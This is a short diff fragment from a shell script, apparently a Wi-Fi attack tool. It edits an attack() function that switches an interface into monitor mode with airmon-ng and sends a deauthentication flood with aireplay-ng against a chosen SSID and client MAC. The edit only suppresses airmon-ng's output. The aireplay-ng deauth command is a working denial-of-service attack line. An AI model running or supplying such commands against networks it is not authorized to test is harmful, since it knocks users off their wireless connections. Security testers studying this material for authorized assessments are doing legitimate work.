@@ -44,10 +44,10 @@ attack() {
     channel=$2
     requestNum=$3
     info "Putting $interface into monitor mode ($monitor) with channel $channel"
-    airmon-ng start $interface $channel
+    airmon-ng start $interface $channel <<< "n" &> /dev/null
     info "Attacking $ssid"
     aireplay-ng --deauth $requestNum -e $ssid -h $mac $monitor
-    airmon-ng stop $monitor
+    airmon-ng stop $monitor <<< "n" &> /dev/null
 }
 #Quit function
 quit() {
